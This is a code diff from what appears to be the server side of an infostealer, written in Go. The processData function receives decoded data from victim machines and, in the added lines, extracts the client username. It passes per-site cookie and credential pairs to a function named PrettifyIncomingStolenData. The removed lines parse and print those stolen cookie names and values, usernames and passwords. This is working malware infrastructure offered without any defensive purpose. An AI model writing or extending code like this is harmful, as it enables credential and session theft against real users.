@@ -114,8 +114,13 @@ func processData(args string, writer *bufio.Writer) {
 		return
 	}
 
-	// search for first instance of {" indicating start of json object in input string from client
 	dataString := string(decoded)
+
+	// search for the username from the client computer
+	username := GetUsername(dataString)
+
+	// search for first instance of {" indicating start of json object in input string from client
+
 	jsonStartingIndex := strings.Index(dataString, "{\"")
 	if jsonStartingIndex == -1 {
 		sendResponse(writer, "BAD Error in finding json substring, probably empty.")
@@ -133,65 +138,11 @@ func processData(args string, writer *bufio.Writer) {
 		return
 	}
 
-	// now we have the key:value pairs, split the substrings based on ; and ||| delimiters
-
-	for site, value := range jsonObject {
-
-		// fmt.Printf("Raw data for %v, data: %v\n", site, value)
-
-		valueStr, ok := value.(string)
-		if !ok {
-			log.Printf("Error - Value for key %v is not a string, skipping. Value is: %v\n", site, value)
-			continue
-		}
-
-		// these should match the client constants
-		// variable names the same in server and client
-		const TERMINATOR = ";>|;}|;|£ "
-		const KEY_VAL_DELIM = "|<£||>"
-
-		// split the substrings by ";"
-		substrings := strings.Split(valueStr, TERMINATOR)
-
-		for _, substring := range substrings {
-
-			// trim whitespace to help out with less errors in the below parsing
-			// helps to prevent splitting when we have no more ||| to split on
-			trimmedSubstring := strings.TrimSpace(substring)
-			if trimmedSubstring == "" {
-				continue
-			}
-
-			// now split on ||| to pull out cookie name / username ||| value / password
-			parts := strings.Split(substring, KEY_VAL_DELIM)
-
-			// handle errors
-			if len(parts) == 0 || len(parts) == 1 && parts[0] == "" {
-				continue
-			} else if len(parts) != 2 {
-				// handle errors where a semicolon is found within the body of a string, e.g. in a password - this will cause
-				// the function to chop up the password as substrings
-				log.Printf("Invalid format: expected 2 parts but found %d in substring '%s', parts: %v\n", len(parts), substring, parts)
-				continue
-			}
-
-			// print left and right part
-			fmt.Printf("Site: %s, Cookie name / username: %s, Cookie value / password: %s\n", site, parts[0], parts[1])
-		}
-
-		// console formatting
-		fmt.Println()
-
+	// now we have the key:value pairs, process the data appropriately.
+	if err = PrettifyIncomingStolenData(jsonObject, username); err != nil {
+		sendResponse(writer, "BAD Error whilst processing data")
+		return
 	}
 
-	fmt.Println()
-	fmt.Println()
-	fmt.Println("Summary of sites data extracted for:")
-
-	for key := range jsonObject {
-		fmt.Println(key)
-	}
-
-	// log.Printf("\n\n*****************\nProcessed data:\n%v\n", string(decoded))
 	sendResponse(writer, "OK Data processed")
 }
